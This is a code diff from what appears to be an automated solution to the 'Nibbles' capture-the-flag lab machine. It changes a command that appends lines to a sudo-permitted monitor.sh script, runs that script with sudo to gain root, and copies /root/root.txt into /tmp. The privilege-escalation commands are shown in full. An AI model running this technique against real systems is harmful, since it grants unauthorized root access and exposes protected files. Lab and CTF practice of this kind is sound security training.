@@ -114,10 +114,13 @@ output = run_php(
 assert "monitor.sh" in output and "NOPASSWD" in output, output
 
 command = (
-    "printf '\\n/usr/bin/id > /tmp/nibbles-native-root-proof"
-    "\\n/usr/bin/cat /root/root.txt > /tmp/nibbles-native-root-answer"
-    "\\n/bin/chmod 0644 /tmp/nibbles-native-root-answer\\n' "
-    ">> /home/nibbler/personal/stuff/monitor.sh && "
+    "echo '/usr/bin/id > /tmp/nibbles-native-root-proof' >> "
+    "/home/nibbler/personal/stuff/monitor.sh && "
+    "echo '/usr/bin/cat /root/root.txt > /tmp/nibbles-native-root-answer' >> "
+    "/home/nibbler/personal/stuff/monitor.sh && "
+    "echo '/bin/chmod 0644 /tmp/nibbles-native-root-answer' >> "
+    "/home/nibbler/personal/stuff/monitor.sh && "
+    "echo MONITOR_SCRIPT && cat /home/nibbler/personal/stuff/monitor.sh && "
     "sudo -n /home/nibbler/personal/stuff/monitor.sh 2>&1; "
     "echo SUDO_STATUS:$?; "
     "echo ROOT_PROOF; cat /tmp/nibbles-native-root-proof 2>&1; "
